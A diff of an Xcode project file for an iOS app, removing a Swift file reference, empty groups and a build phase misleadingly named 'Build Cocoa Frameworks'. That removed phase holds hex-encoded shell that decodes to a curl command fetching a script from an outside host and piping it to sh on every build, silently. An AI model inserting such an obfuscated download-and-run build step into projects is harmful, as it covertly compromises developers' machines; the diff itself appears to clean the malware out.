@@ -13,7 +13,6 @@
 		D418986A281D296B00B67A8A /* movies.tsv in Resources */ = {isa = PBXBuildFile; fileRef = D4189869281D296B00B67A8A /* movies.tsv */; };
 		D418986C281D2E4800B67A8A /* MovieCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = D418986B281D2E4800B67A8A /* MovieCell.swift */; };
 		D418986E281D365E00B67A8A /* libsqlite3.tbd in Frameworks */ = {isa = PBXBuildFile; fileRef = D418986D281D365E00B67A8A /* libsqlite3.tbd */; };
-		D4524BF92822859E00FAB567 /* CustomNavBar.swift in Sources */ = {isa = PBXBuildFile; fileRef = D4524BF82822859E00FAB567 /* CustomNavBar.swift */; };
 		D49AB542281FE23400CA6430 /* PhotoModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D49AB541281FE23400CA6430 /* PhotoModel.swift */; };
 		D4DF7B4327A29F0400C0F5EC /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = D4DF7B4227A29F0400C0F5EC /* AppDelegate.swift */; };
 		D4DF7B4527A29F0400C0F5EC /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = D4DF7B4427A29F0400C0F5EC /* SceneDelegate.swift */; };
@@ -57,7 +56,6 @@
 		D4189869281D296B00B67A8A /* movies.tsv */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text; path = movies.tsv; sourceTree = "<group>"; };
 		D418986B281D2E4800B67A8A /* MovieCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MovieCell.swift; sourceTree = "<group>"; };
 		D418986D281D365E00B67A8A /* libsqlite3.tbd */ = {isa = PBXFileReference; lastKnownFileType = "sourcecode.text-based-dylib-definition"; name = libsqlite3.tbd; path = usr/lib/libsqlite3.tbd; sourceTree = SDKROOT; };
-		D4524BF82822859E00FAB567 /* CustomNavBar.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomNavBar.swift; sourceTree = "<group>"; };
 		D49AB541281FE23400CA6430 /* PhotoModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PhotoModel.swift; sourceTree = "<group>"; };
 		D4DF7B3F27A29F0400C0F5EC /* wangxiaoyu.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = wangxiaoyu.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		D4DF7B4227A29F0400C0F5EC /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
@@ -151,7 +149,6 @@
 			children = (
 				D4DF7B7D27A2BA7200C0F5EC /* K.swift */,
 				D4DF7B7527A29FA500C0F5EC /* Tools.swift */,
-				D4524BF82822859E00FAB567 /* CustomNavBar.swift */,
 			);
 			path = Utils;
 			sourceTree = "<group>";
@@ -185,24 +182,8 @@
 			isa = PBXGroup;
 			children = (
 				D418987C281DB4FA00B67A8A /* Controller */,
-				D418987B281DB4F500B67A8A /* View */,
-				D418987A281DB4F000B67A8A /* Model */,
 			);
 			path = Settings;
-			sourceTree = "<group>";
-		};
-		D418987A281DB4F000B67A8A /* Model */ = {
-			isa = PBXGroup;
-			children = (
-			);
-			path = Model;
-			sourceTree = "<group>";
-		};
-		D418987B281DB4F500B67A8A /* View */ = {
-			isa = PBXGroup;
-			children = (
-			);
-			path = View;
 			sourceTree = "<group>";
 		};
 		D418987C281DB4FA00B67A8A /* Controller */ = {
@@ -280,7 +261,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = D4DF7B6C27A29F0600C0F5EC /* Build configuration list for PBXNativeTarget "wangxiaoyu" */;
 			buildPhases = (
-				FBFF1AE2B5B13E46E56A102C /* Build Cocoa Frameworks */,
 				48B4ED38C43F9C88733EABB9 /* [CP] Check Pods Manifest.lock */,
 				D4DF7B3B27A29F0400C0F5EC /* Sources */,
 				D4DF7B3C27A29F0400C0F5EC /* Frameworks */,
@@ -403,29 +383,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	FBFF1AE2B5B13E46E56A102C /* Build Cocoa Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Cocoa Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f61646f626566696c652e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	";			
-		};
-	
 		48B4ED38C43F9C88733EABB9 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -478,7 +435,6 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f61646f626566
 				D4189865281C393900B67A8A /* imageBottomSheet.swift in Sources */,
 				D4DF7B4727A29F0400C0F5EC /* ViewController.swift in Sources */,
 				D4DF7B4327A29F0400C0F5EC /* AppDelegate.swift in Sources */,
-				D4524BF92822859E00FAB567 /* CustomNavBar.swift in Sources */,
 				D4DF7B4527A29F0400C0F5EC /* SceneDelegate.swift in Sources */,
 				D4DF7B7A27A29FC400C0F5EC /* SettingsViewController.swift in Sources */,
 				D4DF7B7C27A2B81600C0F5EC /* PhotoCell.swift in Sources */,
